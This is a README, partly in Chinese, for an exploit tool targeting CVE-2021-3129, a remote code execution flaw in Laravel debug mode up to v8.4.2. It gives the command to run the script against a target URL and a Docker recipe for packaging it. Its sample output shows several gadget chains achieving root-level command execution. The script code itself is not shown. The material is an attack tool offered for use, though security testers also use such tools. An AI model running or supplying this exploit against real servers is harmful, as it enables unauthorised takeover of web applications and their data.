# CVE-2021-3129
Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)

修改了@crisprss师傅的 https://github.com/crisprss/Laravel_CVE-2021-3129_EXP 增加了更多可用的 gadget 用于遍历

Use：
```
python3 exp.py http://127.0.0.1:8888
```

效果：
![images](https://github.com/zhzyker/CVE-2021-3129/blob/main/2021-02-18_13-46.png)
```
zhzy@debian:/opt/tools/vuln/laravel/CVE-2021-3129/phpggc$ python3 exp.py http://127.0.0.1:8888
[*] Try to use Laravel/RCE1 for exploitation.
[+]exploit:
[*] Laravel/RCE1 Result:


[*] Try to use Laravel/RCE2 for exploitation.
[+]exploit:
[*] Laravel/RCE2 Result:


[*] Try to use Laravel/RCE3 for exploitation.
[+]exploit:
[*] Laravel/RCE3 Result:


[*] Try to use Laravel/RCE4 for exploitation.
[+]exploit:
[*] Laravel/RCE4 Result:


[*] Try to use Laravel/RCE5 for exploitation.
[+]exploit:
[*] Laravel/RCE5 Result:

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

[*] Try to use Laravel/RCE6 for exploitation.
[+]exploit:
[*] Laravel/RCE6 Result:

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

[*] Try to use Laravel/RCE7 for exploitation.
[+]exploit:
[*] Laravel/RCE7 Result:


[*] Try to use Monolog/RCE1 for exploitation.
[+]exploit:
[*] Monolog/RCE1 Result:

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

[*] Try to use Monolog/RCE2 for exploitation.
[+]exploit:
[*] Monolog/RCE2 Result:

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

[*] Try to use Monolog/RCE3 for exploitation.
[+]exploit:
[*] Monolog/RCE3 Result:


[*] Try to use Monolog/RCE4 for exploitation.
[+]exploit:
[*] Monolog/RCE4 Result:

```

# RUN

```
docker build . -t cve-2021-3129
docker run --rm -it cve-2021-3129 "http://<IP>:<PORT>"
```